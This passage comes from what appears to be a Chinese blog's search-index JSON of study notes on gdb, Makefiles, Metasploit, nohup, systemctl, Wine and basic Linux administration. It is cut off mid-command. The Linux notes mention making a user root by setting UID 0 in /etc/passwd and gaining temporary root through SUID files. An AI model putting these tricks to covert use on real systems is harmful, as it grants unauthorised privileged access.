 查看其他文件:\n  l a.c:20 表示查看 a.c文件里的20的行内容\n  l a.c:function_name 查看 a.c文件里fun函数\n\nb ----breakpoint 下断点\nbreak----------&gt;\n条件断点:\nb 15 if i==15 表示在15行变量i=15时停下\n查看断点信息:\ni b-------information of break\ninfo break----&gt;\nd----删除断点\ninfo break\n\np ----print 打印\nprint------&gt;\n\nptype----查看变量类型\n\ndiplay----display----追踪变量(循环里可运用)\nundisplay----去掉追踪变量的值\n用之前需获取变量ID\n使用 info display 获取\n然后 undisplay var_ID\n\nr ----run运行\nstart------&gt;\nvmmap ----查看内存分布\nn----单布调试(绕过函数体)\nc----继续执行(遇到断点停下)\ns----(单步)(可进入函数体)\nu----跳出单次循环\nfinish----跳出当前进入的函数\n\ngdb调试的layout使用layout：用于分割窗口，可以一边查看代码，一边测试。主要有以下几种用法：layout src：显示源代码窗口layout asm：显示汇编窗口layout regs：显示源代码/汇编和寄存器窗口layout split：显示源代码和汇编窗口layout next：显示下一个layoutlayout prev：显示上一个layoutCtrl + L：刷新窗口Ctrl + x，再按1：单窗口模式，显示一个窗口Ctrl + x，再按2：双窗口模式，显示两个窗口Ctrl + x，再按a：回到传统模式，即退出layout，回到执行layout之前的调试窗口。\n\n查看栈指针SP的位置\np $sp\n查看该进程的内存映射\ni proc mapping\nMakefileMakefile规则TARGET....: DEPENDEDS...\nCOMMAND\n...\n...\n在执行动作命令之前会判断所DEPENDEDS条件是满足,若不满足,则执行依赖项\nclean规则会执行 -$(RM)$(TARGET)$(OBJS)命令\nclean用于清除中间生成文件\n\n注意:COMMAND之前必须有TAB键，不能使用空格来代替\n\nmake命令执行的时候会根据文件的时间搓来判断是否执行相关的命令\n\n匹配模式例:\nmain.o:main.c add/add.h sub/sub.h\tgcc -c -o main.o main.c -Iadd -Isub\n\n简便方法实现相同功能:\nmain.o:%o:%c\tgcc -c$&lt; -o $@\n\n%o:%c表示将TARGET域的.o拓展名替换为.c,即main.o 替换为main.c.$&lt;表示依赖项的结果,即main.c$@表示TARGET域的名称,即 main.o\n函数:$(wildcard .&#x2F;*.c)  —获取.&#x2F;下的所有.c文件$(patsubst %.o,%.c,a.o) —将.o替换为.c\n!在命令前加’-‘,若命令执行失败,则忽略该命令,继续往下执行.\n若在当前目录下存在一个’clean’文件,则就无法使用make clean来实现清除的目的需要在Makefile中声明伪目标.具体实现:\n.PHONY:clean\tclean:\n\n","categories":["env"],"tags":["gcc"]},{"title":"makefile","url":"/2019/11/21/dev/language/makefile/makefile/","content":"makefileCC = gccCFLAGS = -IincludeTARGET = Hello$(TARGET):lib/main.o lib/CC.o  lib/BB.o\t$(CC) -o Hello $&lt;main.o:%o:%c\t$(CC) -c -o lib/main.o $&lt; $(CFLAGS)BB.o:src/%o:%c\t$(CC) -c -o lib/BB.o $&lt; $(CFLAGS)CC.o:src/%o:%c\t$(CC) -c -o lib/CC.o src/CC.c  $(CFLAGS)clear:\trm -f Hello lib/main.o lib/BB.o lib/CC.o\n\n\n\nmake2\ncacu:add_int.o add_float.o sub_int.o sub_float.o main.o\tgcc -o cacu add/add_int.o add/add_float.o sub/sub_int.o sub/sub_float.o main.omain.o:main.c add/add.h\tgcc -c -o main.o main.c -Iadd -Isubadd_int.o:add/add_int.c\tgcc -c -o add/add_int.o add/add_int.cadd_float.o:add/add_float.c\tgcc -c -o add/add_float.o add/add_float.csub_int.o:sub/sub_int.c sub/sub.h\tgcc -c -o sub/sub_int.o sub/sub_int.csub_float.o:sub/sub_float.c\tgcc -c -o sub/sub_float.o sub/sub_float.cclean:\trm -f cacu add/add_int.o add/add_float.o sub/sub_int.o sub/sub_float.o main.o\n\n\n\nmake3\nVPATH = .:add:sub:CC = gccOBJS = add_int.o add_float.o sub_int.o sub_float.o main.oOBJSDIR=objsCFLAGS= -Isub -Iadd -O2TARGET= cacuRM = rm -f$(TARGET):$(OBJS)\t$(CC) -o $(TARGET) $(OBJS) $(OBJS):%.o:%.c\t$(CC) -c $(CFLAGS) $^ -o $@clean:\t$(RM) $(OBJS) $(TARGET)\n\n","categories":["language"],"tags":["makefile"]},{"title":"Metasoploit Framework","url":"/2019/10/30/security/msf/","content":"MSFMetasploit（MSF）是一个免费的、可下载的框架\n它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。\n当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了，仿佛一夜之间，任何人都可以成为黑客。\n因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。也因此软件厂商再也不能推迟发布针对已公布漏洞的补丁了，因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。\nMSF安装介绍MSF官网：https://www.metasploit.com/\nMSF有两个版本，Metaploit是开源免费的，Metaploit pro的商业收费的，这里我们用免费的社区版就可以了\nMSF下载地址：https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers\n","categories":["security"],"tags":["msf"]},{"title":"nohup命令","url":"/2019/10/27/env/linux/nohup/","content":"nohup命令nohup 命令运行由 Command参数和任何相关的 Arg参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 &amp; （ 表示“and”的符号）到命令的尾部。nohup 是 no hang up 的缩写，就是不挂断的意思。nohup命令：如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用nohup命令。该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中。回到顶部案例\nnohup command &gt; myout.file 2&gt;&amp;1 &amp;   \n\n\n在上面的例子中，0 – stdin (standard input)，1 – stdout (standard output)，2 – stderr (standard error) ；2&gt;&amp;1是将标准错误（2）重定向到标准输出（&amp;1），标准输出（&amp;1）再被重定向输入到myout.file文件中。\n\n0 22 * * * &#x2F;usr&#x2F;bin&#x2F;python &#x2F;home&#x2F;pu&#x2F;download_pdf&#x2F;download_dfcf_pdf_to_oss.py &gt;&#x2F;home&#x2F;pu&#x2F;download_pdf&#x2F;download_dfcf_pdf_to_oss.log 2&gt;&amp;1\n\n\n这是放在crontab中的定时任务，晚上22点时候怕这个任务，启动这个python的脚本，并把日志写在download_dfcf_pdf_to_oss.log文件中回到顶部nohup和&amp;的区别\n&amp; ： 指在后台运行nohup ： 不挂断的运行，注意并没有后台运行的功能，，就是指，用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系，例如我们断开SSH连接都不会影响他的运行，注意了nohup没有后台运行的意思；&amp;才是后台运行\n&amp;是指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出那么，我们可以巧妙的吧他们结合起来用就是nohup COMMAND &amp;这样就能使命令永久的在后台执行例如：\n\nsh test.sh &amp;将sh test.sh任务放到后台 ，即使关闭xshell退出当前session依然继续运行，但标准输出和标准错误信息会丢失（缺少的日志的输出）\n\n将sh test.sh任务放到后台 ，关闭xshell，对应的任务也跟着停止。2. nohup sh test.sh将sh test.sh任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入），重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。3. nohup sh test.sh  &amp;将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。 \n","categories":["env"],"tags":["linux"]},{"title":"systemctl命令","url":"/2019/09/26/env/linux/systemctl/","content":"systemctl命令systemctl list-units             ## 列出当前系统服务的状态\nsystemctl list-unit-files       ## 列出服务的开机状态\nsystemctl status sshd         ## 查看指定服务的状态\nsystemctl stop sshd             ## 关闭指定服务\nsystemctl start sshd            ## 开启指定服务\nsystemctl restart sshd          ##从新启动服务\nsystemctl enable sshd           ##设定指定服务开机开启\nsystemctl disable sshd          ##设定指定服务开机关闭\nsystemctl reload sshd           ##使指定服务从新加载配置\nsystemctl list-dependencies sshd    ##查看指定服务的倚赖关系\nsystemctl mask  sshd            ## 冻结指定服务\nsystemctl unmask sshd          ##启用服务\nsystemctl set-default multi-user.target ##开机不开启图形\nsystemctl set-default graphical.target  ##开机启动图形\nsetterm                 ##文本界面设定color \n","categories":["env"],"tags":["linux"]},{"title":"wine安装与配置","url":"/2019/09/25/env/linux/linux-wine/","content":"wine安装与配置\n安装wine32dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32\n准备字体为了让中文界面的Windows 应用程序在Wine里运行时能正确显示中文字，需要中文版Windows操作系统下面的字体：C:\\WINDOWS\\Fonts\\simsun.ttc，复制一份到Linux系统中&#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;windows&#x2F;Fonts里面[root@kashu Fonts]# pwd;ll&#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;windows&#x2F;Fonts-rw-r–r–. 1 root root 10512288 Sep 15 04:41 simsun.ttcsimfang.ttc 是许多 Windows 应用默认使用 simfang.ttc 字体。\n修改&#x2F;root&#x2F;.wine&#x2F;system.reg（可以先cp &#x2F;root&#x2F;.wine&#x2F;system.reg &#x2F;root&#x2F;.wine&#x2F;system.reg.bak备份一下）装好字体后，还要修改一下 Wine 的注册表设置，指定与字体相关的设置：gedit &#x2F;root&#x2F;.wine&#x2F;system.reg（一定要使用 gedit 、vim或其他支持 gb2312&#x2F;utf8 编码的编辑器修改这些文件，否则文件中的中文可能变乱码）搜索： LogPixels找到的行应该是：[System\\CurrentControlSet\\Hardware Profiles\\Current\\Software\\Fonts]将其中的：“LogPixels”&#x3D;dword:00000060改为：“LogPixels”&#x3D;dword:00000070搜索： FontSubstitutes找到的行应该是：[Software\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes]将其中的：“MS Shell Dlg”&#x3D;”Tahoma”“MS Shell Dlg 2″&#x3D;”Tahoma”改为：“MS Shell Dlg”&#x3D;”SimSun”“MS Shell Dlg 2″&#x3D;”SimSun”\n修改  &#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;windows&#x2F;win.inigedit &#x2F;root&#x2F;.wine&#x2F;drive_c&#x2F;windows&#x2F;win.ini在文件末尾加入：[Desktop]menufontsize&#x3D;13messagefontsize&#x3D;13statusfontsize&#x3D;13IconTitleSize&#x3D;13\n最关键的一步，把下面的代码保存为kashu.reg，然后直接在linux终端上执行regedit kashu.reg即可   代码:REGEDIT4[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes]&quot;Arial&quot;=&quot;simsun&quot;&quot;Arial CE,238&quot;=&quot;simsun&quot;&quot;Arial CYR,204&quot;=&quot;simsun&quot;&quot;Arial Greek,161&quot;=&quot;simsun&quot;&quot;Arial TUR,162&quot;=&quot;simsun&quot;&quot;Courier New&quot;=&quot;simsun&quot;&quot;Courier New CE,238&quot;=&quot;simsun&quot;&quot;Courier New CYR,204&quot;=&quot;simsun&quot;&quot;Courier New Greek,161&quot;=&quot;simsun&quot;&quot;Courier New TUR,162&quot;=&quot;simsun&quot;&quot;FixedSys&quot;=&quot;simsun&quot;&quot;Helv&quot;=&quot;simsun&quot;&quot;Helvetica&quot;=&quot;simsun&quot;&quot;MS Sans Serif&quot;=&quot;simsun&quot;&quot;MS Shell Dlg&quot;=&quot;simsun&quot;&quot;MS Shell Dlg 2&quot;=&quot;simsun&quot;&quot;System&quot;=&quot;simsun&quot;&quot;Tahoma&quot;=&quot;simsun&quot;&quot;Times&quot;=&quot;simsun&quot;&quot;Times New Roman CE,238&quot;=&quot;simsun&quot;&quot;Times New Roman CYR,204&quot;=&quot;simsun&quot;&quot;Times New Roman Greek,161&quot;=&quot;simsun&quot;&quot;Times New Roman TUR,162&quot;=&quot;simsun&quot;&quot;Tms Rmn&quot;=&quot;simsun&quot;\n\n6.配置中文之后,比如安装QQ,若想通过命令行启动QQ,那就通过别名来实现:修改家目录下的.bashrc文件.找到存在别名地方命令的位置\n","categories":["env"],"tags":["linux"]},{"title":"Linux 基础命令","url":"/2019/09/25/env/linux/linux_usage/","content":"Linux 基础命令ls显示目录  参数:     -a　显示所有     -l　显示详细     -i　显示文件id\npwd打印当前目录\ncp  复制文件　参数:    -r复制包括子目录    -ｐ复制包括文件属性    例:如何在复制时重命名，把Downloads复制到home目录下    并命名为rename_file\ncp -r /home/logan/Downloads /home/rename_file\n# 前提是在home/目录下无rename_file文件夹才可命名成功\n\nrm  删除文件或文件夹　参数:    -r删除包括子目录文件或文件夹    -f强行执行\n  快捷键:Ctrl+L 可达到清屏目的，等同于输入命令clear\nmv移动或重命名文件\n  mkdir–make directory  创建目录　参数:    -p创建连续父子目录\n　rmdir—remove empty directory  删除空目录\n　如何修改语言:输入locale 查看各种功能语言，在输入相应的值进行修改．\n　\ntouch创建一个文件  注意,若创建含有空格的名称文件需要使用单引号或双引号括起来\ncat显示文件内容，从上往下输出，直到输出完毕  参数:    -n显示行号\ntac倒着打印,于cat相同，从下往上输出，直到输出完毕不支持-n  \nmore显示文件内容－可以往下翻页\nless显示文件内容－可以往上翻页　使用技巧:输入&#x2F;+keyword可以查找你所需要的信息\n  head—show with text　显示文件内容-指定行号进打印前几行内容　参数:    -n指定行号\ntail显示文件内容-指定行号进行打印后几行内容  参数:    -n指定行号    -f动态显示文件末尾内容注意，head与tail未指定行数时，默认为10行\nln生成链接文件－默认硬链接  语法: ln -s [原文件] [目标文件]  参数: -s创建软链接\nchmod改变文件或文件目录的权限  语法:chomd [{ugoa}{+-&#x3D;}{rwx}] {文件目录}             [mode&#x3D;421] {文件目录}  参数:    -R递归修改　／Important!!!!\nchown改变文件或目录的所属者\nchgrp改变文件或目录的所属组\numask  显示,设置文件的缺省权限  参数:    -S以rwx形式显示新建文件缺省文件权限注:&#x2F;&#x2F;&#x2F;比如:  umask  0022  (0022)代表使用777-755 &gt;&gt;rwx-r_x-r_x\nfind文件搜索  语法:find [搜索范围] [匹配条件]  例如:\n  find &#x2F;etc&#x2F; -name woshi  —-使用号代表搜索号里面的有关内容\n  find &#x2F;etc&#x2F; -size +204800  —-搜索大于100M的文件  (+n 大于　-n小于　n等于)\n  find &#x2F; -cmin -5 —在&#x2F;目录下查找５min之内被修改属性的文件　(若超过５min使用+)\n  find &#x2F;etc -size +163840 -a -size -204800  在&#x2F;etc下查找大于80MB小于100MB的文件\n  find &#x2F;etc -name inittab -exec ls -l {} ;  在&#x2F;etc下查找inittab文件并显示其详细信息  -exec&#x2F;-ok 命令 {} ;\n  参数:    -name使用名称搜索    -size根据大小搜索 \n-amin根据改动的访问时间 access\n-cmin根据文件改动的属性 change\n-mmin根据文件内容改动 modify\n-o条件中任意一各条件满足即可\n-type根据文件类型查找(f文件　d目录 l软链接文件)\n-inum根据i节点查寻 \n\n压缩打包命令若打包 a 目录\ntar -cvf a.tar a\n若打包并压缩为gz格式\ntar -zcvf a.tar.gz\n若打包并压缩为bz2格式\ntar -jcvf a.tar.bz2\n解包tar\ntar -xvf a.tar -C ./\t\t(-C代表指定的目录)\n解包gz\ntar -cxvf a.tar.gz -C ./\n解包tar.bz2\ntar -jxvf a.tar.bz2 -C ./\n\ngzip\nbzip2\nrar\n压缩: rar a ***\n解压: rar x ***.rar\nzip\n压缩: zip ***\n解压: unzip *** -d 目录\n\n网络命令  write—给指定在线用户发送消息  按: Ctrl + D 保存结束\n  wall—发送广播信息\n  ping—测试网络的连通性  参数:    -c指定发送次数  例如:ping 192.168.03.01\n  nslookup—(翻译域名为IP)\n  ifconfig—查看当前计算机网卡还有ip地址  (interface configure)\n  mail—查看发送邮件  进入以后 h列出 d删除 q退出 邮件序列号-查看邮件\n  last—列出目前与过去登入系统的用户信息\n  lastlog—检查某特定用户上次登录的时间  参数:    -u  例如:lastlog -u logan\n  traceroute—显示数据包到主机之间的路径  例如:traceroute www.baidu.com\n  netststat—显示网络相关的信息  参数:    -t TCP协议    -u UDP协议    -l 监听    -r 路由    -n 显示IP地址和端口号  范例:    netstat -tlun 查看本地监听端口    netstat -an　 查看本地所有的网络链接    netstat -rn   查看本机路由表\n  mount—挂载  umount—\n关机重启命令  shutdown—(优先使用)  参数:    -h 关机    -r 重启    -c 取消　halt—关机\n  poweroff—关机  reboot—重启\n  init 0—关机　init 6—重启  系统运行级别     0 关机    1 单用户    2 不完全多用户，不含NFS服务    3 完全多用户    4 未分配    5 图形界面    6 重启\n  runlevel—查询系统运行级别\n  logout—退出登录\n文本编辑器Vim进入插入模式:a 在光标所在字符后插入\nA 在光标所在行尾插入\ni 在光标所在字符前插入\nI 在光标所在行首插入\no 在光标下插入新行\nO 在光标上插入新行\n\n定位命令:set nu 设置行号\nset nonu 取消行号\ngg  到第一行\nG   到最后一行\nnG  到第n行\nn   到第n行\n$   移至行尾\n0   移至行首\n\n删除命令:x   删除光标标所在处字符\nnx  除光标所在后n个字符\ndd  删除光标所在行\nndd 删除光标所在的n行\ndG  删除光标删除光标所在行到文件末尾内容\nD   删除光标所在处到行尾内容\nnl,n2d  删除指定内容\n\n复制和剪切命令:yy   复制当前行\nnyy  复制当前行的以下n行\ndd   剪切当前行\nndd  剪切当前行以下n行\np,P  粘贴在当前光标所在行下或行上\n\n替换和取消命令:r    取代光标所在字符\nR    从光标所在处开始替换字符，按Esc结束\nu    撤销\n\n搜索命令:/string  搜索指定字符串,若搜索时忽略大小写:set ic\nn\t 搜索\ns/old/new/g      替换当前行\n%s/old/new/g     全文替换指定字符串\nn1,n2s/old/new/g 在一定范围内替换指定字符串\n\n!cmd —-(执行shell命令)分屏操作:\n水平分屏: sp + file\n垂直分屏: vsp + file\n切换屏幕:   Ctrl +ww\n保存并全部退出: wqall 后加all\n保存和退出命令:\nw    保存修改\nw new_filename 保存为指定文件\nwq   保存修改并退出\nZZ   快捷键,保存修改并退出\nq!   不保存修改退出\nwq!  保存修改并退出(文件所有者及root可使用)\n\nvim使用技巧r !命令\t 导入命令执行结果\nmap 快捷键 触发命令　　　　定义快捷键\n例如:\nmap ^P I#&lt;ESC&gt;\nmap ^B 0x\n连续注释技巧:\nn1,n2s/^/内容/g\nn1,n2s/^#//g\nn1,n2s/^/\\/\\//g\t(使用转义符\\)\n替换\nab 输入内容 变成内容\n若想永久保存自定义命令或快捷键,修改用户目录下.vimrc配置文件\n\n用户配置文件查看配置文件的帮助信息: man 5 配置文件名\n用户信息文件/etc/passwd\n第1字段:用户名\n第2字段:密码标志\n第3字段:UID\nUID:\n0         root\n1~499 \t  系统用户\n500~65535 普通用户\n第4字段:GID(用户初始组)\n第5字段:用户说明\n第6字段:家目录\n第7字段:登录之后的Shell\n影子文件    /etc/\t密码存放文件\n组密码文件   /etc/gshadow\n第一字段:组名\n第二字段:组密码\t\n第三字段:组管理员用户名\t\n第四字段:组中附加用户\n组信息文件   /etc/group\n第一字段:组名\n第二字段:组密码标志\n第三字段:GID\n第四字段:组中附加用户\n\n如何使其他用户变为超级用户更改&#x2F;etc&#x2F;passwd的UID为0即可    用户的邮箱文件: &#x2F;var&#x2F;spool&#x2F;mail&#x2F;用户名&#x2F;    用户模板目录:\t&#x2F;etc&#x2F;skel&#x2F;\t(就是创建用户时家目录中出现的文件,用户的家目录中的文件就是从这拷贝来的)\n用户管理命令useradd添加用户参数:    -u 指定用户UID    -d 指定家目录    -c 用户说明    -g 指定初始组    -G 指定用户的附加组    -s 指定用户登录的shell，默认是&#x2F;bin&#x2F;bash    -m 指定用户的家目录,若不存在，则创建一个    用户默认值文件:    &#x2F;etc&#x2F;default&#x2F;useradd\t—创建用户的默认属性    &#x2F;etc&#x2F;login.defs —密码有效期文件\n  adduser—添加用户脚本    可以添加完整的目录\n  passwd—-修改或添加用户密码参数:    -S 查询用户密码的密码状态    -l 暂时锁定用户 -u 解锁用户  usermod—修改用户信息\n  whoami—查看当前用户\n  change—-修改用户密码状态\n  userdel—删除用户   -r 删除用户同时删除用户家目录\n  su——–用户切换    注意:直接使用su并不能全部切换为切换的用户    参数：    - 选项只使用＂-＂代表连带用户环境变量一起切换    -c 仅执行一次命令，而不切换用户身\n手动删除用户vi /etc/passwd\nvi /etc/shadow\nvi /etc/group\nvi /etc/gshadow\nrm -rf /var/spool/mail/用户名\nrm -rf /home/用户名\n\nid查看用户ID\nenv查看环境变量\n用户组管理命令groupadd添加组  参数:    -g      指定GID\ngroupmod修改组    -g      修改组GID    -n      修改组名\ngroupdel删除组\ngpasswd把用户添加入组或从组里删除    -a 把用户加入组    -d 把用户从组中删除\n权限管理ACL权限查看分区ACL权限是否开启:dumpe2fs -h &#x2F;dev&#x2F;sda3 (-h仅显示超级块中的信息)临时开启分区ACL权限: mount -o remount,acl &#x2F;永久开启ACL权限:修改 &#x2F;etc&#x2F;fstab重新挂载文件系统 mount -o remount &#x2F;\ngetfacl + 目录—查看ACLsetfacl—-设定ACL权限命令  参数:    -m 设定ACL权限    -x 删除指定的ACL权限    -b 删除所有的ACL权限    -d 设定默认ACL权限    -k 删除默认ACL权限    -R 递归设定ACL权限  例如: setfacl -m u:用户名:rwx 目录 &#x2F;&#x2F;给用户        setfacl -m g:组名:rwx 目录   &#x2F;&#x2F;给组\n最大权限mask:\n\n  mask是用来指定最大有效权限的．如果我妈给用户赋予ACL权限，是需要和mask的权限”相与”才能利亚到用户的真正权限  例如: setfacl -m m:rx 目录&#x2F;文件 \n删除ACL: setfacl u:用户名 目录/文件\n递归ACL权限: setfacl -m  u:用户名:权限 -R  目录 注意:-R 只能在后面\n\n  默认ACL权限: setfacl -m d:u:用户名:权限 -R  目录 (防止子目录中产生的新文件没有该用户的ACL权限)\n文件特殊权限SetUID (灵魂附体,只能是对可执行文件有效)\nchmod 4755 文件名 4代表是SUID\nchmod u+s  文件名 2代表是SGID\n          1代表是SID\n可利用修改一些命令文件,可获得暂时的root身份\n取消SUID: 直接输入 chmod 755 文件名\n\nSetGID(暂时升级为组的该文件的所属组)\nchmod g+s 目录/文件名\n\nSticky BIT------SBIT\nchmod 1755 目录\nchmod o+t  目录\n\n技巧: echo 文本内容 &gt;&gt; 文件 —–向文件中写入数据  文件系统属性权限:chattr[+-&#x3D;][选项] 文件&#x2F;目录  选项:    -i 如果对文件设了i属性,那么对文件不能修改,也对root有效    -a 只能增加文件内容，其他不能做其他的  lsattr—查看文件系统属性权限  参数:    -a 显示所有文件和目录    -d 仅显示目标目录或文件\n系统命令权限: sudo\n\n  描述:把本来只能超级用户的执行命令赋予普通命令执行  操作对象是系统命令\n  visudo—实际修改的是&#x2F;etc&#x2F;sudoers文件  例如:    用户名　ALL&#x3D;&#x2F;sbin&#x2F;shutdown -r now    sudo -l　可查看可用的sudo命令  使用: sudo &#x2F;sbin&#x2F;shutdown -r now\n文件管理  mount—挂载  语法: mount [-t 文件系统] [-L 卷标名] [-o 特殊选项] 设备名 挂载点  参数:    -a 根据 &#x2F;etc&#x2F;fstab的内容，自动挂载    -t 加入文件系统类型来指定挂载类型，可以以ext3,ext4,iso9660等文件系统    -L 卷标名:挂载指定卷标的分区，而不是安装设备文件名挂载    -o 特殊选项:可以指定挂载的额外选项    常见额外选项:    remount  rw&#x2F;ro  exec&#x2F;noexec\nfdisk分区-自动挂载与fstab文件修复\n\n  fstab文件: &#x2F;etc&#x2F;fstab　开机自动挂载文件    第1字段:UUID&#x2F;设备文件名    第5字段:分区是否被dump备份0代表不备份,1代表每天备份,2代表不定期备份    第6字段:指定分区是否被fsck检测，0代表不检测,其他数字代表检测的优先级,那么当然1的优先级比2高\n!!!!!!!\t注意:若手动修改&#x2F;etc&#x2F;fasab文件之后，写之后记得去使用 mount -a命令来自动挂载，防止下次开机系统崩溃.    若系统出错后,一般进入只读状态,使用命令:mount -o remount,rw &#x2F;进行重新挂载\n  df—文件系统查看  参数:    -a 显示所有文件系统信息,包括特殊文件系统,如&#x2F;proc,&#x2F;sysfs    -h 使用习惯单位显示容量,如KB,MB或GB等    -T显示文件系统类型    -m 以MB为显示单位    -k 以KB为显示单位  du—查看文件总的大小    注意:ls命令只能查看本目录和子目录下的文件名大小之和  常用: du -sh 目录\n  fsck—文件系统修复命令  参数：    -a 不用显示用户提示,自动修复文件系统    -y 自动修复.和-a作用一致,不过有些文件系统只支持-y\n  dumpe2fs—显示磁盘状态命令\n  分区命令:    fdisk  参数:    -l 显示分区信息\t\n!!! 注意: 在分区之后要得重新读取分区表信息    命令: partprobe\n  格式化命令:    mkfs -t ext4 &#x2F;dev&#x2F;sdb1  注意:拓展分区不能格式化\n  分配swap  free-查询swap占用情况  fdisk中使用l查看ID,swap为82,分配好内存分区后,使用t来改变该分区的ID,改为swap.  修改之后使用命令mkswap 来格式化该分区  改好之后可使用swapon &#x2F;dev&#x2F;sdb6 来挂载swap(暂时)  spwaoff可来umount swap  若想永久修改,可修改 &#x2F;etc&#x2F;fstab 按着要求填写\nshell基础环境变量  source—重新读取配置文件  source等效于’.’  . 配置文件 or source 配置文件  shell支持的配置文件: &#x2F;etc&#x2F;shells\nshell 脚本  如何run shell脚本:  1-使用绝对路径 2-使用相对路径 3-bash + 当前目录下的shell脚本  在shell脚本中必写:#!&#x2F;bin&#x2F;bash —告诉计算机这是shell脚本\nwindows中编写的shell脚本的回车符是M$,而Linux是$,这造成了windows和linux不兼容,使用命令 dos2unix可以改变格式.: \necho打印字符串在终端  参数:    -e 支持反斜线控制的字符转换  若想颜色输出: echo -e “\\e[1;31m abcd \\e[0m”  30m&#x3D;黑色　31m&#x3D;红色 32m&#x3D;绿色 33m&#x3D;黄色  34m&#x3D;蓝色  35m&#x3D;洋红 36m&#x3D;青色 37m&#x3D;白色\nhistory历史命令  参数:    -c 清楚历史    -w 把缓存历史命令写入保存中 ~&#x2F;.bash_history  历史命令默认保存1000条　可以在环境变量配置文件&#x2F;etc&#x2F;profile中修改  历史命令的调用:  使用上下键,!n 执行第n行命令 !!重复执行上一条,!字符串 \nalias 别名&#x3D;’原命令’\t—设定别名  alias 查询别名  让别名永久生效:修改 ~&#x2F;.bashrc    命令执行顺序  1—绝对路径\\相对路径  2—别名  3—bash内部命令  4—$PATH环境变量　查看—echo $PATH\n多命令执行顺序  命令1;命令2   命令1&amp;&amp;命令2    命令||命令2   顺序执行\t　　逻辑与　　　　逻辑或\n  dd if&#x3D;输入文件 of&#x3D;输出文件 bs&#x3D;字节数 count&#x3D;个数\n管道符命令1 | 命令2  —命令1的正确输出作为命令2的输入  例如:分屏显示:  ls -al &#x2F;etc | more\n  grep—搜索内容    -i 忽略大小写    -n 输出行号    -v 反向查找    –color&#x3D;auto 搜索出的关键字用颜色显示　例如: netstat -an | grep “ESTABLISHED”  查看多少人连接\n数值运算与运算符declare—声明变量类型- :给变量设定类型属性\n+ :取消变量类型的属性\n-i:给变量声明为整数型(integer)\n-x:给变量声明为环境变量\n-p:显示指定变量的被声明类型\n\n  例:a&#x3D;1;b&#x3D;2;declare -i c&#x3D;$a+$b;echo $c  使用expr或let数值运算工具  例:a&#x3D;1;b&#x3D;2;c&#x3D;$(expr $a + $b)  注:+号的左右两侧必须有空格\n法三:(常用)  $((运算式))或$[运算式]\n变量的测试与变量的替换\nx=$&#123;y-New_Value&#125; \nx=$&#123;y:-New_value&#125;\nx=$&#123;y+New_value&#125;\nx=$&#123;y:+New_value&#125;\nx=$&#123;y=New_value&#125;\nx=$&#123;y:=New_value&#125;\nx=$&#123;y?New_value&#125;\nx=$&#123;y:?New_value&#125;\n\n环境变量的配置文件  &#x2F;etc&#x2F;profile  USER  LOGNASME  MAIL  PATH  HOSTNAME  HISTSIZE  HISTSIZE\n  &#x2F;etc&#x2F;profile.d&#x2F;*.sh\n  ~&#x2F;.bash_profile  ~&#x2F;.bashrc  &#x2F;etc&#x2F;bashrc\nShell欢迎信息&#x2F;etc&#x2F;issue  &#x2F;etc&#x2F;issue.net (登录前)  &#x2F;etc&#x2F;issue　　(本地生效)  \\d 显示当前系统日期  \\s 显示操作系统名称  \\l 显示登录的终端号(比较常用)  \\m 显示硬件结构体系  \\n 显示主机名  \\o 显示域名  \\r 显示内核版本  \\t 显示当前系统时间  \\u 显示当前登录用户的序列号\n  &#x2F;etc&#x2F;issue.net (远程生效)  转义符不生效,只能为纯文本  是否显示欢迎信息,有SSH的配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config决定  加入”Banner &#x2F;etc&#x2F;issue.net”行才能显示,(重启SSH服务) service sshd restart\n  &#x2F;etc&#x2F;motd(登录后)\n正则表达式与通配符  正则表达式  用来在文件中匹配符合条件的字符串，正则是包含匹配.grep,awk,sed\n  Linux通配符号:* ? []  通配符用来匹配符合条件的文件名，通配符是完全匹配.ls,find,cp这些命令不支持正则表达式，所以只能使用shell自己的通配符来进行匹配了.\nshell编程cut—截取字符段截取命令printf—格式化输出服务管理  RPM包安装服务  chkconfig –list  查看自启动服务状态  0~6 代表Linux的运行级别  ps aux  查看进程  源码包安装服务:  安装位置默认: usr&#x2F;local\nTerminal快捷键Ctrl+p    //上一行命令\nCtrl+n\t  //下一行命令\nCtrl+b    //光标向后移动\nCtrl+f\t  //光标向前移动\nCtrl+a    //光标移动到行首\nCtrl+e\t  //光标移动到行未\nCtrl+h\t  //backspace\t\nCtrl+j    //Enter 回车\nCtrl+i\t  //TAb键\nCtrl+d    //Delete\nCtrl+u    //删除光标前面的内\n\n如何使用linux创建U盘启动器   0.格式化U盘,mkfs.vfat &#x2F;dev&#x2F;设备名称\n\n使用　fdisk -h 查看各储存设备名称\n找到U盘盘符名称,使用umont &#x2F;dev&#x2F;设备名称–&#x2F;&#x2F;注意，必须umount掉\n使用dd if&#x3D;sio镜像目录 of&#x3D;&#x2F;dev&#x2F;设备名称 bs&#x3D;2M—设置刻录速度\n回车.—完毕!\n\nlinux文件字符串批量查找, 替换有时候要找一些字符串，但是又不知道在哪个文件，只记得一些字符串\n查找目录下的所有文件中是否含有某个字符串\nfind 